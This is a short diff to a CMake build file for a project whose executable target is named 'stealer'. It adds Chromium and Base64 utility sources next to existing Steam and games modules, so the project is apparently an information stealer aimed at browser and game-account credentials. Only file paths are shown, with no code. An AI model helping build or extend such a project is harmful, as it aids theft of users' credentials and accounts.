@@ -50,6 +50,10 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/games/Games.h
         src/stealer/impl/games/impl/Steam.cpp
         src/stealer/impl/games/impl/Steam.h
+        src/utils/chromuim/ChromuimUtil.cpp
+        src/utils/chromuim/ChromuimUtil.h
+        src/utils/Base64Util.cpp
+        src/utils/Base64Util.h
 )
 
 target_link_libraries(stealer
